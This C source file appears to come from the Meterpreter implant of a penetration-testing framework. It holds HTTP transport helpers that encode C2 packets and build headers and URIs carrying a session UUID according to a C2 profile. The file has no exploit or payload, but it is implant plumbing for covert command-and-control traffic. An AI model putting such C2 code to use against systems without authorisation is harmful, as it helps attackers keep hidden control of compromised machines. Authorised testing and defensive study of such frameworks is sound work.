/*!
 * @file server_http_utils.c
 * @remark HTTP utility function definitions.
 */
#include "metsrv.h"

#ifndef CRYPT_STRING_BASE64URI
#define CRYPT_STRING_BASE64URI 0xd
#endif

/*!
 * @brief Decode incoming packet data based on the configuration.
 * @param ctx Pointer to the HTTP transport context.
 * @param encodedData Pointer to the data that is to be decoded.
 * @param encodedDataLen Size, in bytes, of the data to be decoded.
 * @param data Pointer that will receive the decoded data.
 * @param dataLen Pointer that will receive the length of the decoded data.
 * @return FALSE indicates whether to call free() on the returned value.
 * @description If no decoding is to be done, the returned buffer will just
 * point to the inbound buffer. In this case, the caller should not free()
 * the buffer, and will know not to do so by the \c FALSE result. Otherwise
 * the caller should free() the \c data buffer when the result is \c TRUE.
 */
BOOL decode_encoded_packet(HttpTransportContext* ctx, LPBYTE encodedData, DWORD encodedDataLen, LPBYTE* data, LPDWORD dataLen)
{
	HttpConnection* conn = &ctx->get_connection;
	BOOL result = FALSE;

	switch (conn->options.encode_flags)
	{
	case C2_ENCODING_URL:
	{
		// TODO?
		break;
	}
	case C2_ENCODING_B64:
	case C2_ENCODING_B64URI:
	{
		DWORD flags = conn->options.encode_flags == C2_ENCODING_B64 ? CRYPT_STRING_BASE64 : CRYPT_STRING_BASE64URI;

		if (CryptStringToBinaryA(encodedData, encodedDataLen, flags, NULL, dataLen, NULL, NULL))
		{
			LPBYTE decoded = (LPBYTE)calloc(sizeof(BYTE), *dataLen + 1);
			if (decoded != NULL)
			{
				if (CryptStringToBinaryA(encodedData, encodedDataLen, flags, decoded, dataLen, NULL, NULL))
				{
					result = TRUE;
					*data = decoded;
				}
				else
				{
					free(decoded);
				}
			}
		}

		break;
	}
	case C2_ENCODING_NONE:
	default:
	{
		// do nothing here, as the data doesn't need to be handled
		break;
	}
	}

	if (!result)
	{
		*data = encodedData;
		*dataLen = encodedDataLen;
	}

	return result;
}

/*!
 * @brief Encoding outgoing packet data based on the configuration.
 * @param ctx Pointer to the HTTP transport context.
 * @param data Pointer to the data to be encoded.
 * @param dataLen Length of the data to be encoded.
 * @param encodedData Pointer that will receive the encoded data.
 * @param encodedDataLen Size, in bytes, of the encoded data.
 * @return FALSE indicates whether to call free() on the returned value.
 * @description If no encoding is to be done, the returned buffer will just
 * point to the inbound buffer. In this case, the caller should not free()
 * the buffer, and will know not to do so by the \c FALSE result. Otherwise
 * the caller should free() the \c data buffer when the result is \c TRUE.
 */
BOOL encode_raw_packet(HttpTransportContext* ctx, LPBYTE data, DWORD dataLen, LPBYTE* encodedData, LPDWORD encodedDataLen)
{
	HttpConnection* conn = &ctx->post_connection;
	BOOL result = FALSE;

	switch (conn->options.encode_flags)
	{
	case C2_ENCODING_URL:
	{
		// TODO?
		break;
	}
	case C2_ENCODING_B64:
	case C2_ENCODING_B64URI:
	{
		DWORD flags = conn->options.encode_flags == C2_ENCODING_B64 ? CRYPT_STRING_BASE64 : CRYPT_STRING_BASE64URI;
		flags |= CRYPT_STRING_NOCRLF;

		if (CryptBinaryToStringA(data, dataLen, flags, NULL, encodedDataLen))
		{
			LPBYTE encoded = (LPBYTE)calloc(sizeof(BYTE), *encodedDataLen + 1);
			if (encoded != NULL)
			{
				if (CryptBinaryToStringA(data, dataLen, flags, encoded, encodedDataLen))
				{
					result = TRUE;
					*encodedData = encoded;
				}
				else
				{
					free(encoded);
				}
			}
		}

		break;
	}
	case C2_ENCODING_NONE:
	default:
	{
		// do nothing here, as the data doesn't need to be handled
		break;
	}
	}

	if (!result)
	{
		*encodedData = data;
		*encodedDataLen = dataLen;
	}

	return result;
}

/*!
 * @brief Generate a set of valid HTTP headers for the given connection.
 * @param ctx Pointer to the HTTP transport context.
 * @param conn Pointer to the connection that contains the header configuration.
 * @return Pointer to the headers that are generated. This must be free()'d by the caller.
 */
PWSTR generate_headers(HttpTransportContext* ctx, HttpConnection* conn)
{
	PWSTR headers = ctx->default_options.headers;

	if (conn->options.headers)
	{
		headers = conn->options.headers;
	}

	PWSTR outboundHeaders = NULL;
	PWSTR uuidHeader = conn->options.uuid_header ? conn->options.uuid_header : ctx->default_options.uuid_header;
	if (uuidHeader)
	{
		// UUID is going in the header, so we need to add it. Let's hope people aren't
		// stupid enough to double-up this header. Length needs to include space for \r\n and the colon/space,
		// AND the UUID length itself.
		size_t extraHeaderLength = wcslen(uuidHeader) + 2 + wcslen(ctx->uuid) + 2;
		size_t totalHeaderLength = extraHeaderLength + (headers ? wcslen(headers) : 0) + 2;
		outboundHeaders = (PWCHAR)calloc(totalHeaderLength, sizeof(wchar_t));

		if (headers)
		{
			wcscat_s(outboundHeaders, totalHeaderLength, headers);
			wcscat_s(outboundHeaders, totalHeaderLength, L"\r\n");
		}
		wcscat_s(outboundHeaders, totalHeaderLength, uuidHeader);
		wcscat_s(outboundHeaders, totalHeaderLength, L": ");
		wcscat_s(outboundHeaders, totalHeaderLength, ctx->uuid);
	}
	else if (headers)
	{
		outboundHeaders = _wcsdup(headers);
	}

	if (outboundHeaders)
	{
		dprintf("[WINHTTP] Outbound headers for this request: %S", outboundHeaders);
	}

	return outboundHeaders;
}

/*!
 * @brief Generate the correct URI for the given HTTP connection.
 * @param ctx Reference to the \c HttpTransportContext associated with the request.
 * @param HttpConnect Reference to the \c HttpConnection associated with the request.
 * @return Pointer to a wchar_t string containing the URI. Should be free()'d by the caller.
 * @details This function will steal the UUID from the existing base URI and make sure it
 * is included with any outbound URI that is associated with the request, and hence allows
 * for the URI to change between get and post requests based on a C2 profile.
 */
PWSTR generate_uri(HttpTransportContext* ctx, HttpConnection* conn)
{
	PWCHAR baseUri = ctx->default_options.uri;
	if (conn->options.uri)
	{
		baseUri = conn->options.uri;
	}

	// if we don't have a UUID yet we are going to assume that it's in the base URI.
	// If we do have a URI specified for this connection, we need to parse it. But only
	// if the UUID location parameter is not specified in the cookie/httpheader
	if (!ctx->uuid || conn->options.uuid_cookie || conn->options.uuid_header || ctx->default_options.uuid_cookie || ctx->default_options.uuid_header)
	{
		// return a copy of the baseUri in this case, the caller should free the result.
		return _wcsdup(baseUri);
	}

	PWCHAR getParam = ctx->default_options.uuid_get;
	if (conn->options.uuid_get)
	{
		getParam = conn->options.uuid_get;
	}


	// General form of the URI will be
	// -- /some/uri/(UUID)?some=thing(&param=UUID)
	// The location of the UUID changes depending on what's provided in the configuration

	PWCHAR queryString = wcschr(baseUri, L'?');
	size_t queryStringLen = queryString ? wcslen(queryString) : 0;
	size_t baseUriLen = queryString ? queryString - baseUri : wcslen(baseUri);
	size_t uuidLen = wcslen(ctx->uuid) + 2; // enough space for including slashes if required

	if (getParam)
	{
		queryStringLen += 2 + wcslen(getParam);
	}

	// now let's glue the things together (with NULL terminator)
	size_t uriLen = baseUriLen + queryStringLen + uuidLen + 1;
	PWCHAR uri = (PWCHAR)calloc(uriLen, sizeof(wchar_t));

	wcsncpy_s(uri, uriLen, baseUri, baseUriLen);

	// we put the UUID in the URI if it's not going in the query string
	if (!getParam)
	{
		wcscat_s(uri, uriLen, L"/");
		wcscat_s(uri, uriLen, ctx->uuid);
		wcscat_s(uri, uriLen, L"/");
	}

	// append existing query string, if any
	if (queryString)
	{
		wcscat_s(uri, uriLen, queryString);
	}

	// add the query string paramter if required
	if (getParam)
	{
		wcscat_s(uri, uriLen, queryString ? L"&" : L"?");
		wcscat_s(uri, uriLen, conn->options.uuid_get);
		wcscat_s(uri, uriLen, L"=");
		wcscat_s(uri, uriLen, ctx->uuid);
	}

	dprintf("[GENURI] final URI: %S", uri);

	return uri;
}

